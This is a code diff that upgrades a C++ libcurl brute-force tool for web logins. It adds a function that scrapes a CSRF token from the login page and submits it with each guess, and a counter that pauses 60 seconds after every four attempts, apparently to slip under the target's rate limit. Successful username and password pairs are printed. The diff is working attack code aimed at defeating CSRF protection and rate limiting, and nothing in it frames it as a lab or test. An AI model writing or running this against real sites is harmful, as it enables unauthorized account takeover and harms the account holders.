@@ -18,6 +18,7 @@
 #include <netinet/in.h>
 
 std::mutex log_mutex;
+int attempt_count = 0;
 
 void log_attempt(const std::string& attempt) {
     std::lock_guard<std::mutex> lock(log_mutex);
@@ -29,11 +30,38 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
     return size * nmemb;
 }
 
+std::string fetch_csrf_token(const std::string& login_page_url) {
+    CURL* curl = curl_easy_init();
+    if (!curl) return "";
+    
+    std::string response;
+    curl_easy_setopt(curl, CURLOPT_URL, login_page_url.c_str());
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_perform(curl);
+    curl_easy_cleanup(curl);
+    
+    size_t pos = response.find("name=\"csrf_token\" value=\"");
+    if (pos != std::string::npos) {
+        size_t start = pos + 27;
+        size_t end = response.find("\"", start);
+        return response.substr(start, end - start);
+    }
+    return "";
+}
+
 bool http_brute_force(const std::string& target, const std::string& username, const std::string& password) {
+    if (attempt_count >= 4) {
+        std::cout << "[INFO] Rate limit reached. Sleeping for 60 seconds..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(60));
+        attempt_count = 0;
+    }
+    
+    std::string csrf_token = fetch_csrf_token(target);
     CURL* curl = curl_easy_init();
     if (!curl) return false;
     
-    std::string post_fields = "username=" + username + "&password=" + password;
+    std::string post_fields = "email=" + username + "&password=" + password + "&csrf_token=" + csrf_token;
     std::string response;
     
     curl_easy_setopt(curl, CURLOPT_URL, target.c_str());
@@ -47,6 +75,7 @@ bool http_brute_force(const std::string& target, const std::string& username, co
     curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
     
     curl_easy_cleanup(curl);
+    attempt_count++;
     
     if (res == CURLE_OK && http_code == 200 && response.find("Invalid") == std::string::npos) {
         std::cout << "[SUCCESS] Web Login: " << username << " : " << password << std::endl;
